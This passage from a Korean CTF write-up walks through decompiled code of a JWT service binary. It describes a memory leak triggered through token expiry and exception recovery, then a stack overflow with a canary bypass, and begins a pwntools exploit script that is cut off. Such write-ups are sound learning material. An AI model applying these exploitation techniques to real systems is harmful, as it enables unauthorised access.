</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      v14 = __cxa_allocate_exception(0x20uLL);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      sub_E3DC(v14, (unsigned int)v18, v19);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      __cxa_throw(v14, (struct type_info *)&amp;typeinfo for&#39;</span><span style="color:#a6e22e">jwt</span><span style="color:#f92672">::</span><span style="color:#a6e22e">error</span><span style="color:#f92672">::</span><span style="color:#a6e22e">signature_generation_exception</span>, <span style="color:#a6e22e">sub_26F5A</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v15</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_E231</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v16</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_9F24</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v18</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_9E44</span>(<span style="color:#a6e22e">v16</span>, <span style="color:#a6e22e">v15</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#a6e22e">_BYTE</span>)<span style="color:#a6e22e">result</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">v17</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">__cxa_allocate_exception</span>(<span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">uLL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sub_E426</span>(<span style="color:#a6e22e">v17</span>, (<span style="color:#a6e22e">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">v18</span>, <span style="color:#a6e22e">v19</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__cxa_throw</span>(<span style="color:#a6e22e">v17</span>, (<span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">type_info</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">typeinfo</span> <span style="color:#66d9ef">for</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">jwt</span><span style="color:#f92672">::</span><span style="color:#a6e22e">error</span><span style="color:#f92672">::</span><span style="color:#a6e22e">token_verification_exception</span>, <span style="color:#a6e22e">sub_26E40</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>이때도 hex-rays 상에 보이지 않는 핸들러가 존재한다.
<img loading="lazy" src="/blog/Dreamhack_KAIST_POSTECH_CTF_2023/graph2.png" alt=""  />

<img loading="lazy" src="/blog/Dreamhack_KAIST_POSTECH_CTF_2023/graph3.png" alt=""  />

<img loading="lazy" src="/blog/Dreamhack_KAIST_POSTECH_CTF_2023/graph4.png" alt=""  />

<img loading="lazy" src="/blog/Dreamhack_KAIST_POSTECH_CTF_2023/graph5.png" alt=""  />

이때 priv_flag에 0이 대입된다.
token status에서 jwt 토큰을 받고, 그 토큰에 대한 정보를 출력한다.</p>
<h2 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span>    <span style="color:#a6e22e">new_string</span>(<span style="color:#a6e22e">v15</span>, <span style="color:#e6db74">&#34;Company&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_11F76</span>(<span style="color:#a6e22e">v1</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v15</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v10</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">verify_0</span>(<span style="color:#a6e22e">v2</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v17</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">string</span><span style="color:#f92672">::~</span><span style="color:#a6e22e">string</span>(<span style="color:#a6e22e">v15</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::~</span><span style="color:#a6e22e">allocator</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub_F350</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v10</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">string</span><span style="color:#f92672">::~</span><span style="color:#a6e22e">string</span>(<span style="color:#a6e22e">v14</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::~</span><span style="color:#a6e22e">allocator</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">string</span><span style="color:#f92672">::~</span><span style="color:#a6e22e">string</span>(<span style="color:#a6e22e">v13</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::~</span><span style="color:#a6e22e">allocator</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub_F370</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v16</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">string</span><span style="color:#f92672">::~</span><span style="color:#a6e22e">string</span>(<span style="color:#a6e22e">a1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">allocator</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::~</span><span style="color:#a6e22e">allocator</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub_F10A</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v11</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub_120B8</span>(<span style="color:#a6e22e">v11</span>, <span style="color:#a6e22e">v17</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v8</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">v11</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#a6e22e">_QWORD</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v7</span>[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_12184</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v11</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#a6e22e">_QWORD</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v10</span>.<span style="color:#a6e22e">type</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_121A2</span>(<span style="color:#a6e22e">v8</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">sub_121C0</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v7</span>[<span style="color:#ae81ff">3</span>], <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v10</span>) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">v9</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">sub_12208</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v7</span>[<span style="color:#ae81ff">3</span>]);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">v3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, <span style="color:#a6e22e">v9</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">v4</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#a6e22e">v3</span>, <span style="color:#e6db74">&#34; = &#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">v5</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_1222D</span>(<span style="color:#a6e22e">v4</span>, (<span style="color:#a6e22e">data</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">v9</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ostream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;</span>(<span style="color:#a6e22e">v5</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">endl</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sub_121E6</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v7</span>[<span style="color:#ae81ff">3</span>]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub_F608</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v11</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub_F27A</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v17</span>);
</span></span></code></pre></div><p>이때 문제는 memory leak은 파싱된 jwt의 body를 기준으로 출력하며, 내부적으로 key, value 형태의 오브젝트로 구현된다.
register시에 initialize되어 null terminated string이 아니라, 파싱된 스트링을 jwt 토큰 제작에 이용하므로 memory leak이 절대 불가능하다.
하지만 Exception이 발생했을때 복구 로직에 구현 오류가 존재한다.
<img loading="lazy" src="/blog/Dreamhack_KAIST_POSTECH_CTF_2023/graph6.png" alt=""  />

exception 복구 로직은 진한 초록색으로 하이라이팅되어있는 부분이다.
<img loading="lazy" src="/blog/Dreamhack_KAIST_POSTECH_CTF_2023/graph7.png" alt=""  />

<img loading="lazy" src="/blog/Dreamhack_KAIST_POSTECH_CTF_2023/graph8.png" alt=""  />

이때 ptr이 참조되면서 복구 로직이 수행된다.
구현이 가용성에 초점이 맞춰져있어서 exception이 thrown되어도 정상처리를 가능케 해준다.
이를 악용하기 위해서는 JWT 토큰을 검증 시각에 invalidate하게 만들 필요가 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span>  <span style="color:#a6e22e">clock</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">chrono</span><span style="color:#f92672">::</span><span style="color:#a6e22e">_V2</span><span style="color:#f92672">::</span><span style="color:#a6e22e">system_clock</span><span style="color:#f92672">::</span><span style="color:#a6e22e">now</span>(<span style="color:#a6e22e">STR</span>);
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">new_string</span>(<span style="color:#a6e22e">v33</span>, <span style="color:#e6db74">&#34;JWT&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v4</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">setting_typ</span>(<span style="color:#a6e22e">v3</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v33</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(<span style="color:#a6e22e">_DWORD</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v16</span>[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sub_115E4</span>(<span style="color:#a6e22e">v19</span>, (<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v16</span>[<span style="color:#ae81ff">8</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v20</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_11607</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">clock</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">v19</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">v5</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">setting_exp</span>(<span style="color:#a6e22e">v4</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v20</span>);
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span> 	<span style="color:#a6e22e">v4</span> <span style="color:#f92672">=</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">a1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ret_a1_1</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v4</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">copy_obj</span>(<span style="color:#a6e22e">v5</span>, <span style="color:#a6e22e">a2</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v6</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">v2</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">ret_a1_1</span>(<span style="color:#a6e22e">v5</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">set_result</span>(<span style="color:#a6e22e">v7</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v6</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">v7</span>[<span style="color:#ae81ff">0</span>];
</span></span></code></pre></div><p>마침 expire time이 30초이므로 그 시간을 sleep하고 token을 검증하면 invalidate 시킬 수 있고, 복구 로직에 의해서 memory가 leak된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span>  <span style="color:#a6e22e">v5</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_object_object_get</span>(<span style="color:#a6e22e">a1</span>, <span style="color:#e6db74">&#34;args&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v6</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_object_object_get</span>(<span style="color:#a6e22e">v5</span>, <span style="color:#e6db74">&#34;idx&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">v6</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_object_object_get</span>(<span style="color:#a6e22e">v5</span>, <span style="color:#e6db74">&#34;data&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v3</span> <span style="color:#f92672">=</span> ((<span style="color:#a6e22e">__int64</span> (<span style="color:#a6e22e">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#a6e22e">__int64</span>))<span style="color:#a6e22e">json_object_array_length</span>)(<span style="color:#a6e22e">v6</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">data_len</span> <span style="color:#f92672">=</span> ((<span style="color:#a6e22e">__int64</span> (<span style="color:#a6e22e">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#a6e22e">__int64</span>))<span style="color:#a6e22e">json_object_array_length</span>)(<span style="color:#a6e22e">data</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">v3</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x10</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">data_len</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">i</span>; <span style="color:#f92672">++</span><span style="color:#a6e22e">i</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">idx</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_object_array_get_idx</span>(<span style="color:#a6e22e">data</span>, (<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">i</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#a6e22e">unsigned</span> <span style="color:#66d9ef">int</span>)((<span style="color:#a6e22e">__int64</span> (<span style="color:#a6e22e">__fastcall</span> <span style="color:#f92672">*</span>)())<span style="color:#a6e22e">json_object_get_type</span>)() <span style="color:#f92672">==</span> <span style="color:#a6e22e">json_type_int</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">v9</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_object_get_int64</span>(<span style="color:#a6e22e">idx</span>);
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>bof가 있으니 rip control도 가능하다.
canary는 int가 아닐때 write가 안되니 우회할 수 있다.</p>
<h3 id="exploit-script">Exploit script<a hidden class="anchor" aria-hidden="true" href="#exploit-script">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">from</span> <span style="color:#a6e22e">pwn</span> <span style="color:#66d9ef">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">json</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sla</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lambda</span> <span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">y</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">sendlineafter</span>(<span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">y</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sa</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lambda</span> <span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">y</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">sendafter</span>(<span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">y</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rvu</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lambda</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">recvuntil</span>(<span style="color:#a6e22e">x</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sl</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lambda</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">sendline</span>(<span style="color:#a6e22e">x</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rvl</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lambda</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">recvline</span>()
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">dump</span>(<span style="color:#a6e22e">object</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ret</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;{&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">l</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">len</span>(<span style="color:#a6e22e">object</span>.<span style="color:#a6e22e">keys</span>())
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">it</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">object</span>.<span style="color:#a6e22e">keys</span>()<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">isinstance</span>(<span style="color:#a6e22e">object</span>[<span style="color:#a6e22e">it</span>],<span style="color:#a6e22e">dict</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&#34;&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">isinstance</span>(<span style="color:#a6e22e">it</span>, <span style="color:#a6e22e">bytes</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">it</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">isinstance</span>(<span style="color:#a6e22e">it</span>, <span style="color:#a6e22e">str</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">it</span>.<span style="color:#a6e22e">encode</span>()
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span> 
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;unsupported type&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&#34; : &#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">dump</span>(<span style="color:#a6e22e">object</span>[<span style="color:#a6e22e">it</span>])
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">isinstance</span>(<span style="color:#a6e22e">object</span>[<span style="color:#a6e22e">it</span>],<span style="color:#a6e22e">bytes</span>) <span style="color:#a6e22e">or</span> <span style="color:#a6e22e">isinstance</span>(<span style="color:#a6e22e">object</span>[<span style="color:#a6e22e">it</span>],<span style="color:#a6e22e">str</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&#34;&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">isinstance</span>(<span style="color:#a6e22e">it</span>, <span style="color:#a6e22e">bytes</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">it</span>.<span style="color:#a6e22e">encode</span>()
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">isinstance</span>(<span style="color:#a6e22e">it</span>, <span style="color:#a6e22e">str</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">it</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;unsupported type&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span>  <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&#34; : &#34;&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">isinstance</span>(<span style="color:#a6e22e">object</span>[<span style="color:#a6e22e">it</span>],<span style="color:#a6e22e">bytes</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">object</span>[<span style="color:#a6e22e">it</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">object</span>[<span style="color:#a6e22e">it</span>].<span style="color:#a6e22e">encode</span>()
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&#34;&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">isinstance</span>(<span style="color:#a6e22e">object</span>[<span style="color:#a6e22e">it</span>],<span style="color:#66d9ef">int</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&#34;&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">isinstance</span>(<span style="color:#a6e22e">it</span>, <span style="color:#a6e22e">bytes</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">it</span>.<span style="color:#a6e22e">encode</span>()
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">isinstance</span>(<span style="color:#a6e22e">it</span>, <span style="color:#a6e22e">str</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">it</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;unsupported type&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&#34; : &#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">str</span>(<span style="color:#a6e22e">object</span>[<span style="color:#a6e22e">it</span>]).<span style="color:#a6e22e">encode</span>() <span style="color:#f92672">+</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&#34;&#39;</span>
